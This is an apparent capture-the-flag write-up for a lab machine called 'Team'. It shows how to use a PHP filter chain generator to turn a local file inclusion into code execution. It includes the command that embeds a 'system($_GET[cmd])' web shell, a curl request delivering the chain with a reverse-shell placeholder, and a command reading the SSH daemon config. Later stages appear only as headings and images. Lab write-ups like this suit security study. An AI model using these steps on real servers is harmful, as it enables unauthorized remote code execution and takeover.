# Team - PHP Filter Chain LFI / LXD

## Method 1 - PHP Filter Gadget Chain Generator

Using [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) repository, and any PHP code that can lead to code execution on the target, the following command can be used to exploit the target:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -n1
```

[image]

**Usage:**

```bash
curl http://ip/index.php?page=<gadget chain>&cmd=<reverse shell oneliner>
```

## Shell as www-data

```bash
cat /etc/ssh/sshd_config
```

[image]

## Shell as Dale

[image]

## Root user

[image]
